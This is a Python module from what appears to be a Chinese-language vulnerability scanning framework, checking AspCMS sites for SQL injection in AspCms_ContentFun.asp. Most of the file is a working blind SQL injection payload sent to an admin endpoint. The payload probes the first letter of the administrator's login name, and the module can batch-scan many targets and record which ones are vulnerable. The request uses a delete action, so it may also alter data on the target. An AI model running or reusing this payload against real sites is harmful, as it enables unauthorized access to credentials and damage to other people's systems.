#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class AspCMS_Sql_Scan2:
    def get_url(self,input_url):
        try:
            url = input_url + "/aspcms/admin_aspcms/_content/_Content/AspCms_ContentFun.asp?action=tdel&id=2=iif(((select asc(mid(LoginName,1,1)) from AspCms_User where UserID=1)=97),2,chr(97))"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,timeout=self.timeout)
            if "删除成功" in req.text or "数据类型不匹配" in req.text:
                OutPrintInfoSuc("AspCMS", f'目标ContentFun.asp SQL注入漏洞: {url}')
                if self.batch:
                    OutPutFile("aspcms_sql.txt",f'目标ContentFun.asp SQL注入漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("AspCMS", f'目标ContentFun.asp不存在SQL注入漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("AspCMS",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("AspCMS", '开始检测ContentFun.asp SQL注入漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("AspCMS", 'ContentFun.asp SQL注入漏洞检测结束')



